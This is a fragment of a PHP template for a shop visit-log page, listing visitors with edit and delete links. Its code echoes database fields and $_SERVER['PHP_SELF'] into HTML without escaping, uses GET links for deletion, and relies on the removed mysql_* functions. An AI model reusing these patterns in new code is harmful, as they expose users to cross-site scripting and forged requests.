              <td>Click to Delete this Shop User's Visit: <a href="<?php echo PAGE_SHOP_LOG_DELETE_VISIT . "?visit_id={$visit_id}&shop_id={$shop_id}";?>">Delete</a> </td>
            </tr> <?php } //end if current shop?>
              </table>	    </td>
	      </tr>
          <input type="hidden" name="MM_insert" value="FormEdit">
          <input type="hidden" name="shop_visit_id" value="<?php echo $row_Recordset1['shop_visit_id']; ?>">
          </form>
	  <?php } else { //This section executes if it is not the visit_id selected NOT FOR EDIT ?> 
        <form method="post" name="FormUpdate_<?php echo $row_Recordset1['shop_visit_id']; ?>" action="<?php echo $editFormAction; ?>">
          <tr bordercolor="#CCCCCC">
            <td><a href="<?php echo "{$page_individual_history_log}?contact_id=" . $row_Recordset1['contact_id']; ?>"><?php echo $row_Recordset1['full_name']; ?></a></td>
		  <td><?php echo $row_Recordset1['shop_user_role']; ?></td>
		  <td><?php echo date_to_time($row_Recordset1['time_in']); ?></td>
		  <td><?php echo list_time($row_Recordset1['time_in'],$row_Recordset1['time_out'],'time_out',0,1,'none', 8,$row_Recordset1['et']); ?></td>
		  <td><?php sign_out($row_Recordset1['time_out'], $row_Recordset1['first_name']); ?>&nbsp</td>
		  <td><?php if($shop_CanEdit == 1) {echo "<a href=\"{$_SERVER['PHP_SELF']}?shop_id={$shop_id}&visit_id={$row_Recordset1['shop_visit_id']}\">edit</a>";} else {echo "&nbsp";} ?></td>
	    </tr>
          <input type="hidden" name="MM_insert" value="FormUpdate">
          <input type="hidden" name="shop_visit_id" value="<?php echo $row_Recordset1['shop_visit_id']; ?>">
          </form>
	  <?php } // if
	} //while ($row_Recordset1 = mysql_fetch_assoc($Recordset1)); // while Recordset1 ?>
        </table>  </tr>
  <tr>
    <td height="40" valign="bottom"></td>
    </tr>
</table>
<p>&nbsp;</p>
<?php include("include_footer.html"); ?>
<?php
mysql_free_result($Recordset1);
?>